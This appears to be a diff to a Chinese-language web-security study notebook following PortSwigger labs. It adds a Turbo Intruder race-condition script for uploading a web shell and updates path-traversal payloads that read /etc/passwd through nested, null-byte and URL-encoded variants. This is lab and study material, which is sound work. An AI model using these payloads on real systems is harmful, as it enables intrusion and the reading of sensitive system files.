@@ -105,6 +105,38 @@ exploit.p.phphp
 
 ---
 
+### Race Condition
+
+**[Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)**
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+    request1 = '''<YOUR-POST-REQUEST>'''
+
+    request2 = '''<YOUR-GET-REQUEST>'''
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+
+    # wait until every 'race1' tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate('race1')
+
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+
+---
+
 ### SVG与文件上传
 
 SVG（**Scalable Vector Graphics**，可缩放矢量图形）是一种基于 XML 的矢量图像格式，用于描述二维图形。它于 2001 年 由 W3C 发布第一版标准，HTML5 将其作为原生支持的一部分纳入。
@@ -321,14 +353,14 @@ PHP伪协议能否发挥功能，与PHP配置文件`php.ini`里的两个重要�
 <span style="font-size: 19px;">**PoC**</span>
 
 ```bash
-image?filename=../../../etc/passwd
-image?filename=....//....//....//etc/passwd
-image?filename=..././..././..././etc/passwd
-image?filename=....\/....\/....\/etc/passwd
+image?filename=../../../../../../etc/passwd
+image?filename=....//....//....//....//....//....//etc/passwd
+image?filename=..././..././..././..././..././..././etc/passwd
+image?filename=....\/....\/....\/....\/....\/....\/etc/passwd
 
-image?filename=/var/www/images/../../../etc/passwd
+image?filename=/var/www/images/../../../../../../etc/passwd
 # null byte
-image?filename=../../../etc/passwd%00.jpg
+image?filename=../../../../../../etc/passwd%00.jpg
 ```
 **url encoding**
 
@@ -339,9 +371,9 @@ image?filename=../../../etc/passwd%00.jpg
 # 原始
 image?filename=../../../etc/passwd
 # 一层
-image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
 # 两层
-image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
+image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
 ```
 
 
